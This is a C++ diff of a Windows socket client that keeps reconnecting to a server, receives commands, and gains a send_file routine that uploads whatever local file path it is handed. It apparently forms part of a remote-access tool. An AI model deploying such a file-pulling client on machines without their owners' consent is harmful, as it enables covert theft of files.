@@ -1,7 +1,5 @@
 #include "core.h"
 
-
-
 Core::~Core()
 {
 	closesocket(client_socket);
@@ -15,7 +13,7 @@ void Core::connect_to_server()
 	hints.ai_family = AF_UNSPEC;
 	hints.ai_socktype = SOCK_STREAM;
 	hints.ai_protocol = IPPROTO_TCP;
-	getaddrinfo("127.0.0.1", "1457", &hints, &result);
+	getaddrinfo(IP, PORT, &hints, &result);
 	client_socket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
 	int stat = connect(client_socket, result->ai_addr, (int)result->ai_addrlen);
 	while (stat == SOCKET_ERROR) {
@@ -60,5 +58,74 @@ bool Core::recieve_command(string& command)
 
 	command.assign(comm);
 	delete[] comm;
+	return true;
+}
+
+bool Core::send_file(string filepath)
+{
+	LARGE_INTEGER filesize;
+	string port;
+	recieve_command(port);  // recieve port to send file on
+
+	HANDLE file = CreateFileA(
+		filepath.c_str(),
+		GENERIC_READ,
+		0,
+		NULL,
+		OPEN_EXISTING,
+		FILE_ATTRIBUTE_NORMAL,
+		NULL);
+
+	GetFileSizeEx(file, &filesize);
+	char* file_buffer = (char*)malloc(filesize.LowPart);
+
+	if(!ReadFile(file, file_buffer, filesize.LowPart, 0, NULL))
+	{
+		return false;
+	}
+
+	SOCKET file_socket = socket(AF_UNSPEC, SOCK_STREAM, IPPROTO_TCP);
+	struct addrinfo *sock;
+	getaddrinfo(IP, port.c_str(), NULL, &sock);
+
+	int status = connect(file_socket, sock->ai_addr, sock->ai_addrlen);
+	if(status == SOCKET_ERROR)
+	{
+		closesocket(file_socket);
+		return false; // Transfer Failed
+	}
+
+	string filename = filepath.substr(filepath.find_last_of('.'));
+	if(send(file_socket, filename.c_str(), 10, 0) == SOCKET_ERROR) // send file extension
+	{
+		closesocket(file_socket);
+		return false;
+	}
+
+	char size[15];
+	_itoa_s(filesize.LowPart, size, 15, 10);
+
+	if(send(file_socket, size, 15, 0) == SOCKET_ERROR)  // send file size
+	{
+		closesocket(file_socket);
+		return false;
+	}
+
+	int current_offset = 0;
+	int fsize = filesize.LowPart;
+	while(true)
+	{
+		int bytes_sent = send(file_socket, file_buffer + current_offset,  fsize - current_offset, 0);
+		current_offset += bytes_sent;
+		if (bytes_sent < 0)
+		{
+			return false;
+		}
+		if (bytes_sent == 0)
+		{
+			break;
+		}
+	}
+	closesocket(file_socket);
 	return true;
 }
